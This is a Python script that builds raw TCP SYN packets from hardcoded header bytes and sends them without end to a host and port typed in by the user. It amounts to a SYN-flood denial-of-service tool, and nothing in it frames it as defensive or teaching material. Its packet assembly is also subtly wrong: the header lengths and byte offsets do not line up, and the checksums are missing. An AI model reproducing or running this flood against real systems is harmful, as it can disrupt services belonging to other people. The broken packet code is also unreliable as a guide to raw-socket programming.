import socket
import time

def send_syn(target_host, target_port):
    try:
        
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

        
        ip_header = b"\x45\x00\x00\x28\x12\x34\x00\x00\x40\x06\x00\x00\xc0\xa8\x00\x01"
        tcp_header = b"\x00\x50\x00\x00\x00\x00\x00\x00\x50\x02\x20\x00\x00\x00\x00\x00\x00\x00\x00"

        packet = ip_header + tcp_header

        
        dest_address = socket.inet_aton(target_host)
        packet = packet[:16] + dest_address + packet[20:]

        
        dest_port = target_port.to_bytes(2, byteorder='big')
        packet = packet[:36] + dest_port + packet[38:]

        
        raw_socket.sendto(packet, (target_host, target_port))

        print(f"SYN packet sent to {target_host}:{target_port}")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_host = input("Enter target host: ")
    target_port = int(input("Enter target port: "))

    
    while True:
        send_syn(target_host, target_port)

